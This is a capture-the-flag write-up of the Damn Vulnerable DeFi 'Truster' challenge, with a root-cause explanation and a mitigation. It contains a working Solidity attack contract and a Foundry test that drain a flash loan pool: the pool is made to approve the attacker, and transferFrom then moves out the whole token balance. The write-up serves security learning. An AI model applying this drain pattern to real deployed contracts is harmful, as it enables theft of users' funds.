# Truster — Damn Vulnerable DeFi v4 Challenge

**Author:** 0xmaurice

**Date:** November 13, 2025

**Challenge:** Damn Vulnerable DeFi v4 — *Truster*

**Objective:** Recover all funds from the pool in a single transaction and deposit them into the designated recovery account.

---

## Summary

The Truster pool executes arbitrary external calls on behalf of itself, allowing attackers to make the pool call any contract with any calldata. As a result, an attacker can trick the pool into calling the token contract’s `approve` function, granting the attacker an allowance equal to the pool’s entire token balance.

---

## Scope & Setup

- **TrusterLenderPool.sol**
  - Flash loan contract for lending out the DVT token.
  - Holds `TOKENS_IN_POOL = 1_000_000e18` of DVT in the pool.
- **Player account**
  - Must recover all funds and transfer them to the recovery wallet.

**Goal:** Drain all tokens from the pool and send them to the recovery address in a *single transaction* executed by the player.

---

## Proof of Concept (PoC)

Because the pool accepts an arbitrary `target` and `data` pair and executes them via:

```javascript
target.functionCall(data);
```
an attacker can supply calldata that makes the pool call any contract, including the DVT token contract. Specifically, we can have the pool call `approve()` on the token contract, granting our attacker contract an allowance equal to the full pool balance.

Since the challenge requires the solution to occur in a single transaction, we deploy a helper contract and invoke its `attack()` function. Inside `attack()`, we first call `pool.flashLoan()` with malicious calldata to approve our contract, and then we transfer the tokens to the recovery wallet.

### Foundry Test Example

**Attack Contract**

```javascript
contract RecoveryContract {
    function attack(DamnValuableToken token, TrusterLenderPool pool, address recovery, uint256 amount) external {
        // 1. Have the pool approve this contract
        bytes memory callDataApprove = abi.encodeWithSelector(token.approve.selector, address(this), amount);
        pool.flashLoan(0, msg.sender, address(token), callDataApprove);

        // 2. Transfer the tokens into the recovery wallet
        token.transferFrom(address(pool), recovery, amount);
    }
}
```
**Test**

```javascript
    function test_truster() public checkSolvedByPlayer {
        console.log("Pool DVT Balance Before: ", token.balanceOf(address(pool)));
        console.log("Recovery DVT Balance Before: ", token.balanceOf(recovery));

        console.log("\n Deploying Recovery Contract and execute attack:... \n");

        RecoveryContract recoveryContract = new RecoveryContract();
        recoveryContract.attack(token, pool, recovery, TOKENS_IN_POOL);

        console.log("Pool DVT Balance After: ", token.balanceOf(address(pool)));
        console.log("Recovery DVT Balance After: ", token.balanceOf(recovery));
        console.log("\n Successfully recovered all the funds from the pool.");
    }
```

**Console Output**
```yaml
  Pool DVT Balance Before:  1000000000000000000000000
  Recovery DVT Balance Before:  0
  
  Deploying Recovery Contract and execute attack:... 

  Pool DVT Balance After:  0
  Recovery DVT Balance After:  1000000000000000000000000
  
  Successfully recovered all the funds from the pool.

```
We have successfully recoverd the funds in a *single transaction*.

---

## Explanation

In `TrusterLenderPool`, the line:

```javascript
target.functionCall(data);
```

executes an arbitrary call with `msg.sender == pool`. This means any contract called by the pool will interpret the pool as the caller.

When we encode a call to `token.approve()` inside the flash loan:

- The pool becomes the caller of `approve()`
- The token contract therefore grants our attacker contract an allowance for the full token balance owned by the pool

Once the allowance is set, the attacker simply calls `transferFrom()` to move the tokens.

To avoid this issue, real flash loan implementations (e.g., ERC-3156) do not allow arbitrary target calls. Instead, they use a controlled callback such as:

```javascript
onFlashLoan(...)
```
so the pool never executes user-provided code on its own behalf.

## Root Cause

The pool allows arbitrary external calls using its own authority (`msg.sender == pool`), enabling privilege escalation.

---

## References

* [Damn Vulnerable DeFi Website](https://www.damnvulnerabledefi.xyz/)
* [Damn Vulnerable DeFi GitHub Repository](https://github.com/theredguild/damn-vulnerable-defi/tree/v4.1.0)
* [ERC-3156: Flash Loans](https://eips.ethereum.org/EIPS/eip-3156)

---

## Environment

* Solidity: `0.8.25`
* Framework: Foundry
* Challenge commit: `v4.1.0`

---

**Key Takeaway:**

*Always track who the caller (`msg.sender`) is. If a contract executes arbitrary user-controlled calls on its own behalf, it must be treated as a critical vulnerability unless very carefully constrained.*

---

*Note:* All research, code, and technical explanations were written by **0xmaurice**. Only sentence structure and grammar were reviewed and refined with the help of **ChatGPT**.
